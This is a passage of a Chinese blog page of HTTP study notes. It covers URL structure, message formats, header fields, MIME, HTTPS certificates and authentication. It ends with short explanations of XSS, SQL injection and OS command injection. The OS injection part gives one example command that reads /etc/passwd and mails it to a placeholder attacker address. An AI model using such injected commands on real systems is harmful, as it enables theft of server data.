+<p>http://zxy:123@www.zxy.com/path1?a=1#sec1
+方案、认证信息、==服务器地址、端口==、路径、查询信息、片段</p>
+<h2 id="httpxie-yi-qing-qiu-bao-wen">HTTP协议请求报文<a class="zola-anchor" href="#httpxie-yi-qing-qiu-bao-wen" aria-label="Anchor link for: httpxie-yi-qing-qiu-bao-wen">🔗</a></h2>
+<p>请求方法(GET / POST)  请求资源URI  HTTP协议版本
+请求首部字段 (请求头)
+==空格== ==【CR  0x0d ＋LF 0x0a】==
+请求体</p>
+<h2 id="httpxie-yi-xiang-ying-bao-wen">HTTP协议响应报文<a class="zola-anchor" href="#httpxie-yi-xiang-ying-bao-wen" aria-label="Anchor link for: httpxie-yi-xiang-ying-bao-wen">🔗</a></h2>
+<p>HTTP协议版本 响应码 原因短语
+响应首部字段（响应头）
+==空格==
+响应体</p>
+<h2 id="wang-guan">网关<a class="zola-anchor" href="#wang-guan" aria-label="Anchor link for: wang-guan">🔗</a></h2>
+<p>能够使通信上的服务器提供非Http协议的服务。</p>
+<h2 id="qing-qiu-tou-jie-shao">请求头介绍<a class="zola-anchor" href="#qing-qiu-tou-jie-shao" aria-label="Anchor link for: qing-qiu-tou-jie-shao">🔗</a></h2>
+<ul>
+<li>47种首部字段</li>
+<li>通用首部字段 (请求和响应都使用的字段)</li>
+</ul>
+<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Cache-Control 控制缓存的行为
+Connection 逐跳首部、连接的管理
+Date 创建报文的日期时间
+Pragma 报文指令
+Trailer 报文末端的首部一览
+Transfer-Encoding 指定报文主体的传输编码方式
+Upgrade 升级为其他协议
+Via 代理服务器的相关信息
+Warning 错误通知
+</code></pre>
+<ul>
+<li>请求首部字段</li>
+</ul>
+<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Accept 用户代理可处理的媒体类型
+Accept-Charset 优先的字符集
+Accept-Encoding 优先的内容编码
+Accept-Language 优先的语言（自然语言）
+Authorization Web认证信息
+Expect 期待服务器的特定行为
+From 用户的电子邮箱地址
+Host 请求资源所在服务器
+If-Match 比较实体标记（ETag）
+If-Modified-Since 比较资源的更新时间
+If-None-Match 比较实体标记（与If-Match相反）
+If-Range 资源未更新时发送实体Byte的范围请求
+If-Unmodified-Since 比较资源的更新时间（与If-Modified-Since相反）
+Max-Forwards 最大传输逐跳数
+Proxy-Authorization 代理服务器要求客户端的认证信息
+Range 实体的字节范围请求
+Referer 对请求中URI的原始获取方
+TE 传输编码的优先级
+User-Agent HTTP 客户端程序的信息
+</code></pre>
+<ul>
+<li>响应首部字段</li>
+</ul>
+<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Accept-Ranges 是否接受字节范围请求
+Age 推算资源创建经过时间
+ETag 资源的匹配信息
+Location 令客户端重定向至指定URI
+
+Proxy-Authenticate 代理服务器对客户端的认证信息
+Retry-After 对再次发起请求的时机要求
+Server HTTP服务器的安装信息
+Vary 代理服务器缓存的管理信息
+WWW-Authenticate 服务器对客户端的认证信息
+</code></pre>
+<ul>
+<li>实体首部字段 (请求报文实体和响应报文实体都使用的字段)</li>
+</ul>
+<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Allow 资源可支持的HTTP方法
+Content-Encoding 实体主体适用的编码方式
+Content-Language 实体主体的自然语言
+Content-Length 实体主体的大小（单位 ：字节）
+Content-Location 替代对应资源的URI
+Content-MD5 实体主体的报文摘要
+Content-Range 实体主体的位置范围
+Content-Type 实体主体的媒体类型
+Expires 实体主体过期的日期时间
+Last-Modified 资源的最后修改日期时间
+</code></pre>
+<h2 id="cookiezhuang-tai-zhui-zong-set-cookie">Cookie状态追踪 ==Set-Cookie==<a class="zola-anchor" href="#cookiezhuang-tai-zhui-zong-set-cookie" aria-label="Anchor link for: cookiezhuang-tai-zhui-zong-set-cookie">🔗</a></h2>
+<h3 id="keep-alive-chi-jiu-lian-jie">keep-alive 持久连接<a class="zola-anchor" href="#keep-alive-chi-jiu-lian-jie" aria-label="Anchor link for: keep-alive-chi-jiu-lian-jie">🔗</a></h3>
+<p>不用连接一次http请求一次tcp连接。
+只要tcp没断开，继续http请求，不用重新连接tcp。</p>
+<h2 id="mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan">MIME(Multipurpose Internet Mail Extensions)多用途因特网邮件扩展<a class="zola-anchor" href="#mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan" aria-label="Anchor link for: mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan">🔗</a></h2>
+<ul>
+<li>multipart/form-data 表单访问</li>
+<li>multipart/byteranges 部分内容访问</li>
+<li>boundary=xx来划分不同数据类型</li>
+</ul>
+<pre data-lang="http" class="language-http "><code class="language-http" data-lang="http">Content-Type: multipart&#x2F;form-data; boundary=xx
+--xx
+--xx
+--xx--
+</code></pre>
+<h3 id="bu-fen-nei-rong-qing-qiu-huo-qu">部分内容请求获取<a class="zola-anchor" href="#bu-fen-nei-rong-qing-qiu-huo-qu" aria-label="Anchor link for: bu-fen-nei-rong-qing-qiu-huo-qu">🔗</a></h3>
+<p>==Range: bytes==请求头
+==Range: bytes== =1-5000, 5000-</p>
+<h3 id="nei-rong-xie-shang">内容协商<a class="zola-anchor" href="#nei-rong-xie-shang" aria-label="Anchor link for: nei-rong-xie-shang">🔗</a></h3>
+<p>==Access==请求头</p>
+<h2 id="https">HTTPS<a class="zola-anchor" href="#https" aria-label="Anchor link for: https">🔗</a></h2>
+<h3 id="shu-zi-qian-ming">数字签名<a class="zola-anchor" href="#shu-zi-qian-ming" aria-label="Anchor link for: shu-zi-qian-ming">🔗</a></h3>
+<p>利用非对称加密算法，拿==私钥对摘要信息进行加密==，然后公钥进行解密验证信息。
+最重要的是非对称加密算法特性，==私钥和公钥是一对好CP==。一方加密，另一方就解密。</p>
+<h3 id="shu-zi-zheng-shu">数字证书<a class="zola-anchor" href="#shu-zi-zheng-shu" aria-label="Anchor link for: shu-zi-zheng-shu">🔗</a></h3>
+<p>用于证明==公钥的合法性==，使用私钥对数字签名的公钥进行加密。</p>
+<h3 id="gen-zheng-shu">根证书<a class="zola-anchor" href="#gen-zheng-shu" aria-label="Anchor link for: gen-zheng-shu">🔗</a></h3>
+<p>是公开可信的自签名证书。整个密钥链认证体系，构成了密钥基础设施（PKI）。</p>
+<h3 id="httpszheng-shu-ren-zheng-guo-cheng">Https证书认证过程<a class="zola-anchor" href="#httpszheng-shu-ren-zheng-guo-cheng" aria-label="Anchor link for: httpszheng-shu-ren-zheng-guo-cheng">🔗</a></h3>
+<p>证书是由公钥、颁发机构CA等明文内容+明文内容的hash计算值的签名组成。（签名：使用私钥进行加密）。
+首先是客户端获取到服务器的证书，这个证书可能会包括中间证书，最后会指向根证书。
+然后对证书的签名进行验证证书合法性，使用证书颁发机构CA的公钥对签名进行解密，获得hash值并比较证书内容计算后的hash值是否相同，来判断证书是否合法。</p>
+<p>如果服务器证书包含中间证书的话，1.先获取中间证书的公钥来解密签名判断服务器证书有效性。2.再根据中间证书的颁发机构CA，获取中间证书颁发机构CA的公钥解密中间证书的签名，证明中间证书的有效性。3.以此类推，最后指向一个根证书，只要证明根证书的签名合法性，也就证明了这些中间证书也是合法的。最后，判断服务器证书也是合法的。就可以用服务器证书的公钥，对数据传输的对称密钥进行加密，通过对称密钥进行加密通信。</p>
+<h3 id="zheng-shu-fen-lei">证书分类<a class="zola-anchor" href="#zheng-shu-fen-lei" aria-label="Anchor link for: zheng-shu-fen-lei">🔗</a></h3>
+<p>==费解的地方：要分类证书类别，对公钥功能拆分。除了根证书，签名验证要找证书认证机构的公钥。而不是自己的公钥==
+服务器证书：公钥，用于加密通信用。
+中间证书：公钥，用于证明服务器证书合法性
+根证书：公钥，用于证明中间证书/服务器证书的合法性。自签名证书，公钥解密自己的签名。</p>
+<h3 id="https-tong-xin">HTTPS 通信<a class="zola-anchor" href="#https-tong-xin" aria-label="Anchor link for: https-tong-xin">🔗</a></h3>
+<ul>
+<li>双方通信，客户端获取服务端证书并验证后，发送随机密钥串，完成SSL握手。客户端开始通过密钥串对HTTP报文加密通信。</li>
+</ul>
+<h3 id="shen-fen-ren-zheng">身份认证<a class="zola-anchor" href="#shen-fen-ren-zheng" aria-label="Anchor link for: shen-fen-ren-zheng">🔗</a></h3>
+<h4 id="basicren-zheng">BASIC认证<a class="zola-anchor" href="#basicren-zheng" aria-label="Anchor link for: basicren-zheng">🔗</a></h4>
+<p>HTTP1.0就有了，使用请求头加入账号:密码的Base64字符串形式，不够安全。</p>
+<h4 id="biao-dan-ren-zheng">表单认证<a class="zola-anchor" href="#biao-dan-ren-zheng" aria-label="Anchor link for: biao-dan-ren-zheng">🔗</a></h4>
+<p>也就是利用post请求提交表单，利用cookie携带登录信息认证的。</p>
+<h4 id="webdav">WebDAV<a class="zola-anchor" href="#webdav" aria-label="Anchor link for: webdav">🔗</a></h4>
+<p>WebDAV（ Web-based Distributed Authoring and Versioning，基于万
+维网的分布式创作和版本控制）
+是HTTP的扩展协议，用于服务器相关文件操作，增加了其他的请求方法。</p>
+<h3 id="css">CSS<a class="zola-anchor" href="#css" aria-label="Anchor link for: css">🔗</a></h3>
+<p>让文档内容和设计分离。</p>
+<h3 id="xml">XML<a class="zola-anchor" href="#xml" aria-label="Anchor link for: xml">🔗</a></h3>
+<p>XML（ eXtensible Markup Language，可扩展标记语言）</p>
+<h3 id="sgml">SGML<a class="zola-anchor" href="#sgml" aria-label="Anchor link for: sgml">🔗</a></h3>
+<p>标准通用标记语言 SGML（ Standard Generalized
+Markup Language）</p>
+<h3 id="json">JSON<a class="zola-anchor" href="#json" aria-label="Anchor link for: json">🔗</a></h3>
+<p>JSON（ JavaScript Object Notation）是一种以 JavaScript（ ECMAScript）
+的对象表示法为基础的轻量级数据标记语言。</p>
+<h3 id="xss">XSS<a class="zola-anchor" href="#xss" aria-label="Anchor link for: xss">🔗</a></h3>
+<p>跨站脚本攻击（ Cross-Site Scripting， XSS），就是在访问一个网页请求时，添加一些<code>&lt;script/&gt;</code>脚本代码，里面会访问其他网站，这样会把账号和密码等信息传给其他网站。也可以通过==document.cookie==把当前网站的cookie传给第三方网站。</p>
+<h3 id="sql-zhu-ru-gong-ji">SQL 注入攻击<a class="zola-anchor" href="#sql-zhu-ru-gong-ji" aria-label="Anchor link for: sql-zhu-ru-gong-ji">🔗</a></h3>
+<p>SQL 注入（ SQL Injection），是指Web中通过请求来访问SQL语句时，利用SQL语法特性，比如：添加--表示注释，就把后面一些条件去掉了。达到修改SQL语句来获取请求查询结果。</p>
+<h3 id="oszhu-ru-gong-ji">OS注入攻击<a class="zola-anchor" href="#oszhu-ru-gong-ji" aria-label="Anchor link for: oszhu-ru-gong-ji">🔗</a></h3>
+<p>利用服务器web请求，对请求参数执行os指令来进行加入一些os指令获取信息。比如：发送邮箱内容时，额外添加cat /etc/passwd | mail hack@example.jp，来达到发送服务器密码给邮箱。</p>
+
+      
+      <div class="display-none"><a class="u-bridgy-fed" href="https://fed.brid.gy/"></a></div>
+    </article>
+      
+        <div class="muted">
+          <div class="pb">
+            
+            <span>分类</span>: <a rel="category tag" class="p-category category" href="https://obelieve.github.io/categories/notes/">Notes</a>&nbsp;
+            
+          </div>
+          
+            <div class="inline-block p-tags pb">
+              
+              <span>标签</span>:&nbsp;
+              
+              
+                <a class="p-tag" href="https://obelieve.github.io/tags/http/">http</a>
+                
+              
+              </div>
+          
+            <div class="pb">
+              
+              
+              
+                发布于:&nbsp;
+                <time class="dt-published published" datetime="2025-01-06">2025.01.06</time>
+              
+              
+                · 最后更新时间:&nbsp;
+                <time class="dt-updated updated" datetime="2025-09-16">2025.09.16</time>
+              
+            </div>
+          </div>
+      
+      
+    
+  
+     
+  </div>
+</div>
+
+          </div>
+        </div>
+        
+  <aside class="sidebar px ">
+    
+      <h2 class="pt0">快速导航</h2>
+      
+    <div class="sidebar-table-content">
+      <ul>
+
+        <li>
+          <a href="https://obelieve.github.io/">博客首页</a>
+        </li>
+        <li>
+          <a href="#start">正文开始</a>
+        </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#yi-ci-httpqing-qiu-lian-lu-guo-cheng">一次HTTP请求链路过程</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#tcpsan-ci-wo-shou">TCP三次握手</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#tcpduan-kai-lian-jie">TCP断开连接</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#uri-tong-yi-zi-yuan-biao-shi-fu-he-url-tong-yi-zi-yuan-ding-wei-fu">URI(统一资源标识符)和URL（统一资源定位符）</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#httpxie-yi-qing-qiu-bao-wen">HTTP协议请求报文</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#httpxie-yi-xiang-ying-bao-wen">HTTP协议响应报文</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#wang-guan">网关</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#qing-qiu-tou-jie-shao">请求头介绍</a>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#cookiezhuang-tai-zhui-zong-set-cookie">Cookie状态追踪 ==Set-Cookie==</a>
+            
+              <ul>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#keep-alive-chi-jiu-lian-jie">keep-alive 持久连接</a>
+                    
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#mime-multipurpose-internet-mail-extensions-duo-yong-tu-yin-te-wang-you-jian-kuo-zhan">MIME(Multipurpose Internet Mail Extensions)多用途因特网邮件扩展</a>
+            
+              <ul>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#bu-fen-nei-rong-qing-qiu-huo-qu">部分内容请求获取</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#nei-rong-xie-shang">内容协商</a>
+                    
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+          <li>
+            <a href="https://obelieve.github.io/blog/guan-yu-http/#https">HTTPS</a>
+            
+              <ul>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#shu-zi-qian-ming">数字签名</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#shu-zi-zheng-shu">数字证书</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#gen-zheng-shu">根证书</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#httpszheng-shu-ren-zheng-guo-cheng">Https证书认证过程</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#zheng-shu-fen-lei">证书分类</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#https-tong-xin">HTTPS 通信</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#shen-fen-ren-zheng">身份认证</a>
+                    
+                      <ul>
+                        
+                          <li>
+                            <a href="https://obelieve.github.io/blog/guan-yu-http/#basicren-zheng">BASIC认证</a>
+                            
+                          </li>
+                        
+                          <li>
+                            <a href="https://obelieve.github.io/blog/guan-yu-http/#biao-dan-ren-zheng">表单认证</a>
+                            
+                          </li>
+                        
+                          <li>
+                            <a href="https://obelieve.github.io/blog/guan-yu-http/#webdav">WebDAV</a>
+                            
+                          </li>
+                        
+                      </ul>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#css">CSS</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#xml">XML</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#sgml">SGML</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#json">JSON</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#xss">XSS</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#sql-zhu-ru-gong-ji">SQL 注入攻击</a>
+                    
+                  </li>
+                
+                  <li>
+                    <a href="https://obelieve.github.io/blog/guan-yu-http/#oszhu-ru-gong-ji">OS注入攻击</a>
+                    
+                  </li>
+                
+              </ul>
+            
+          </li>
+        
+        <li>
+          <a href="#response">回应区</a>
+        </li>
+
+      </ul>
+    </div>
+  
+    
+  </aside>
+
+      </div>
+    </div>
+    </div>
+  <div id="bottom"></div>
+  <script>
+  document.getElementById('copyButton').addEventListener('click', function(event) {
+    event.preventDefault();
+    var text = '《关于HTTP》 ' + window.location.href;
+    var textArea = document.createElement('textarea');
+    textArea.textContent = text;
+    document.body.append(textArea);
+    textArea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textArea);
+    document.getElementById('copyStatus').textContent = '已复制 ✅';
+    setTimeout(function() {
+      document.getElementById('copyStatus').textContent = '';
+    }, 1500);
+  });
+</script>
+</body>
+
+</html>
